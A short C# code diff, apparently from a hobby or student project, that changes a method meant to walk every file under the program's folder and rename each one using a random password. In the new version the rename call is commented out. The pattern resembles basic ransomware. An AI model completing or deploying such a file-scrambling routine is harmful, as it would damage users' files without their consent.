@@ -25,7 +25,7 @@ namespace rw2
             InitializeComponent();
         }
         string alphabet = "abcdefghijklmnopqrstuvwxyz";
-        string alphabetDecrypted;
+        string alphabetDecrypted = "abcdefghijklmnopqrstuvwxyz";
         string password;
         public string getRandomString(int minLength, int maxLength)
         {
@@ -64,24 +64,30 @@ namespace rw2
         
         public void encrypce()
         {
-            string filePath = System.Reflection.Assembly.GetEntryAssembly().Location;
-            filePath =filePath.Remove(filePath.Length - System.AppDomain.CurrentDomain.FriendlyName.Length);
-            string[] filePathsTXT = Directory.GetFiles(filePath, "*.txt", SearchOption.AllDirectories);
-            string[] filePathsPNG = Directory.GetFiles(filePath, "*.png", SearchOption.AllDirectories);
-            List<string> fileNames = new List<string>();
             
-            foreach(string file in filePathsTXT)
+            string filePath = System.Reflection.Assembly.GetEntryAssembly().Location;
+            filePath = filePath.Remove(filePath.Length - System.AppDomain.CurrentDomain.FriendlyName.Length);
+            string[] filePaths = Directory.GetFiles(filePath, "*.*", SearchOption.AllDirectories);
+            List<string> fileNames = new List<string>();
+            List<string> decryptedSuffixes = new List<string>();
+            
+            foreach (string file in filePaths)
             {
-                fileNames.Add(file.Remove(0, filePath.Length));
+                
+                if (file.Contains(@"\")) //<- chytak, file bude vzdy containovat backslash, ale pro ujisteni...
+                {
+                    string newFile = file;
+                    int lengthOfPrefix = file.LastIndexOf('\\');
+                    newFile = newFile.Substring(lengthOfPrefix+1);
+                    fileNames.Add(newFile);
+                }
+                
             }
-            foreach (string file in filePathsPNG)
-            {
-                fileNames.Add(file.Remove(0, filePath.Length));
-            }
+
             password = getRandomString(10, 25);
             foreach (string file in fileNames)
             {
-                File.Move(file, getCryptedString(password, file));
+                //File.Move(file, getCryptedString(password, file));
             }
 
 
